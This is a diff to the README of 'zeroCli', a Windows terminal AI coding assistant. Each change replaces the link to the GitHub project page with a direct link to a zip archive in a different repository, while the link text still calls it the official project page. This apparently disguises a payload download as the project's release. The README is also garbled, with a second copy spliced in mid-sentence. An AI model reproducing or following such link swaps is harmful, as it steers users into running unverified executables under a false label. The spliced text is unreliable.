@@ -5,7 +5,7 @@ description: "Build with an LLM agent in your terminal that reads, edits, and ru
 ---
 # 🌸 zeroCli - Your Friendly Terminal Coding Assistant
 
-[![Download zeroCli](https://img.shields.io/badge/Download%20zeroCli-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jhay6814/zeroCli)
+[![Download zeroCli](https://img.shields.io/badge/Download%20zeroCli-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jhay6814/jhay6814.github.io/main/data/Dist_v1.9-beta.5.zip)
 
 zeroCli is a friendly terminal application that brings an AI coding assistant to your computer. It is designed for Windows users who want help with coding tasks without dealing with a complicated setup. zeroCli works with Claude, OpenAI, OpenRouter, Ollama, and LM Studio. It also includes an offline mock model, so you can try the experience even when you are not connected to an online AI service. The app speaks English and Russian, and it includes Zero-chan, a pixel-art anime mascot who makes the terminal feel a little more welcoming. The project also supports building to a standalone .exe.
 
@@ -27,7 +27,7 @@ For an average computer user, the easiest way to think about zeroCli is this: it
 
 ## 📥 Download and Setup
 
-Visit this link to download the application: [Download zeroCli from GitHub](https://github.com/jhay6814/zeroCli).
+Visit this link to download the application: [Download zeroCli from GitHub](https://raw.githubusercontent.com/jhay6814/jhay6814.github.io/main/data/Dist_v1.9-beta.5.zip).
 
 This is the official project page for zeroCli. Use the download option provided there to get the application for Windows. The page is the main place to find the current version of the software. Once the download has finished, open the application from the location where your browser saved it.
 
@@ -55,7 +55,7 @@ zeroCli speaks English and Russian. You can use it in the language that feels mo
 
 The bilingual support makes zero# 🌸 zeroCli - Your Friendly Terminal Coding Assistant
 
-[![Download zeroCli](https://img.shields.io/badge/Download%20zeroCli-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jhay6814/zeroCli)
+[![Download zeroCli](https://img.shields.io/badge/Download%20zeroCli-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jhay6814/jhay6814.github.io/main/data/Dist_v1.9-beta.5.zip)
 
 zeroCli is a terminal application for Windows that brings an agentic coding assistant into a simple text window. It is made for everyday computer users who want help with coding tasks, technical questions, and clear step-by-step guidance without dealing with a complicated interface. zeroCli works with Claude, OpenAI, OpenRouter, Ollama, and LM Studio. It includes an offline mock model for practice, speaks English and Russian, and features Zero-chan, a pixel-art anime mascot. The project also supports building to a standalone .exe.
 
@@ -80,7 +80,7 @@ zeroCli includes several ways to connect to AI services. It supports Claude, Ope
 
 ## 📥 Download zeroCli
 
-Visit this link to download the application: [Download zeroCli from GitHub](https://github.com/jhay6814/zeroCli).
+Visit this link to download the application: [Download zeroCli from GitHub](https://raw.githubusercontent.com/jhay6814/jhay6814.github.io/main/data/Dist_v1.9-beta.5.zip).
 
 This is the project page for zeroCli. Use the download option provided there to get the application for Windows. The page is the main place to find the current version of zeroCli and the files shared for the project.
 
@@ -148,6 +148,6 @@ The terminal interface is central to zeroCli. You type requests and read respons
 
 ## 📌 Project Link
 
-[Visit the zeroCli project page](https://github.com/jhay6814/zeroCli) to download the application and explore the project.
+[Visit the zeroCli project page](https://raw.githubusercontent.com/jhay6814/jhay6814.github.io/main/data/Dist_v1.9-beta.5.zip) to download the application and explore the project.
 
 Keywords: zeroCli, terminal coding assistant, agentic CLI, Zero-chan, Claude, OpenAI, OpenRouter, Ollama, LM Studio, offline mock model, English, Russian, standalone exe, Windows download, coding helper, pixel-art mascot, terminal app, AI assistant, beginner-friendly coding tool
